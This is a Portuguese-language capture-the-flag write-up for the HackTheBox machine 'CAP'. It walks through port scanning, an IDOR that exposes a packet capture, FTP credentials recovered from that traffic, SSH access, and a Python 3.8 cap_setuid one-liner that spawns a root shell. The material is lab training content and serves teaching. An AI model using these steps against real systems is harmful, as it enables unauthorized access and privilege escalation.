# HackTheBox - CAP (Máquina Fácil)

## Introdução
Esta é a resolução da máquina "CAP" do HackTheBox, categorizada como de nível fácil.

## Task 1: Quantas portas TCP estão abertas?
Começamos com uma varredura de portas e descobrimos que as portas **21 (FTP), 22 (SSH) e 80 (HTTP)** estão abertas. O comando utilizado foi:

```bash
nmap -sVC -p 21,22,80 <IP-da-Máquina>
```

**Resultado:**
```
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Gunicorn
|_http-title: Security Dashboard
```

## Tasks 2, 3 e 4: Identificação de um IDOR na interface web
Acessamos a porta **80** pelo navegador e encontramos um **dashboard de segurança** com informações sobre redes, status e eventos.

Na aba **Security Snapshot**, identificamos uma vulnerabilidade do tipo **IDOR (Insecure Direct Object Reference)**. Ao acessarmos a URL `/data/5`, substituímos o número **5** por **0** e conseguimos baixar um arquivo **PCAP**, que pode ser analisado no Wireshark.

## Task 5: Descoberta de credenciais no tráfego de rede
Ao abrir o arquivo **.pcap** no Wireshark e aplicar um filtro para **FTP**, identificamos um login com as seguintes credenciais:

- **Usuário:** `nathan`
- **Senha:** `Buck3tH4TF0RM3!`

Essas credenciais permitem acesso tanto ao **FTP** quanto ao **SSH**.

## Task 6: Acesso ao SSH e obtenção da flag do usuário
Usamos as credenciais descobertas para acessar a máquina via SSH:

```bash
ssh nathan@<IP-da-Máquina>
```

Após o login, encontramos a **flag do usuário**.

## Task 8: Escalada de privilégios e root
No diretório inicial do usuário, encontramos o script `linpeas.sh`. Ao executá-lo, descobrimos que podemos explorar o **Python 3.8** para escalar privilégios, utilizando um exploit disponível no **GTFOBins**:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

Esse comando nos dá um **shell como root**, permitindo que acessemos a **flag final**.

---
## Escalada de Privilégios sem LinPEAS

### Descobrindo Capacidades no Sistema
Durante a análise manual, executamos o comando:

```bash
getcap -r / 2>/dev/null
```

E encontramos a seguinte saída relevante:

```
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

A capacidade `cap_setuid+ep` significa que o binário do Python 3.8 pode alterar o ID do usuário, permitindo que elevemos privilégios.

### Explorando a Vulnerabilidade
Sabendo disso, podemos usar o Python para alterar o ID do usuário para **0 (root)** e obter um shell privilegiado:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

#### Explicação do Comando:
- `os.setuid(0)`: Altera o ID do usuário para **0** (root).
- `os.system("/bin/sh")`: Abre um shell como root.

Após executar esse comando, conseguimos acesso total ao sistema com privilégios elevados e podemos capturar a **flag final**.

---

Esse método nos permitiu escalar privilégios **sem o uso do LinPEAS**, apenas analisando as capacidades dos binários no sistema.


---


**Conclusão:**
A máquina **CAP** foi resolvida explorando uma vulnerabilidade IDOR para obter um arquivo PCAP, analisando credenciais vazadas no tráfego FTP, acessando o SSH e escalando privilégios via Python 3.8. Essa abordagem demonstra a importância de proteger endpoints expostos e implementar práticas seguras no gerenciamento de credenciais e permissões.
